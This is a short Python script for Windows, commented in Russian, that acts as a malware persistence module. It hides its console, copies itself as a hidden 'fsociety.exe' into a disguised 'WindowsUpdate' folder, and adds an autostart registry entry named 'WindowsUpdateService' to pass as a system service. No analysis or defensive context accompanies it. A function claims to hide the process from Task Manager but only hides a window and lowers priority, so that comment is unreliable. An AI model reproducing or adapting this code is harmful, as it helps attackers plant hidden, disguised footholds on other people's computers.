#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import winreg
import ctypes
import shutil
import win32gui
import win32con
import win32process
import win32api

def hide_console():
    if sys.platform == 'win32':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def hide_from_task_manager():
    try:
        # Получаем handle текущего процесса
        hwnd = win32gui.GetForegroundWindow()
        # Скрываем окно
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
        # Устанавливаем флаг скрытия из диспетчера задач
        win32process.SetPriorityClass(win32api.GetCurrentProcess(), 
                                    win32process.BELOW_NORMAL_PRIORITY_CLASS)
    except:
        pass

def add_to_autostart():
    try:
        # Получаем путь к текущему exe файлу
        exe_path = os.path.abspath(sys.argv[0])
        
        # Создаем скрытую папку в Program Files
        target_dir = os.path.join(os.environ['ProgramFiles'], 'WindowsUpdate')
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
            # Делаем папку скрытой
            ctypes.windll.kernel32.SetFileAttributesW(target_dir, 0x02)
        
        # Копируем exe в скрытую папку
        target_path = os.path.join(target_dir, 'fsociety.exe')
        shutil.copy2(exe_path, target_path)
        
        # Делаем файл скрытым
        ctypes.windll.kernel32.SetFileAttributesW(target_path, 0x02)
        
        # Добавляем в автозагрузку через реестр
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        
        # Используем маскировку под системный процесс
        winreg.SetValueEx(key, "WindowsUpdateService", 0, 
                         winreg.REG_SZ, target_path)
        
        winreg.CloseKey(key)
        
        # Скрываем процесс из диспетчера задач
        hide_from_task_manager()
        
    except Exception as e:
        pass

if __name__ == "__main__":
    hide_console()
    add_to_autostart() 